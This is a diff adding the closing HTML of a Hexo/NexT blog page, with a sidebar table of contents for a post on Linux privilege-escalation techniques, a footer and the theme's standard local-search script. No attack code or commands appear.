+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#内核提权"><span class="nav-number">1.</span> <span class="nav-text">内核提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#明文-root-密码提权"><span class="nav-number">2.</span> <span class="nav-text">明文 root 密码提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo-滥用"><span class="nav-number">3.</span> <span class="nav-text">sudo 滥用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#计划任务提权"><span class="nav-number">4.</span> <span class="nav-text">计划任务提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUID-提权"><span class="nav-number">5.</span> <span class="nav-text">SUID 提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Docker-组提权"><span class="nav-number">6.</span> <span class="nav-text">Docker 组提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务漏洞"><span class="nav-number">7.</span> <span class="nav-text">服务漏洞</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tyaoo</span>
+
+  
+</div>
+
+<!--
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
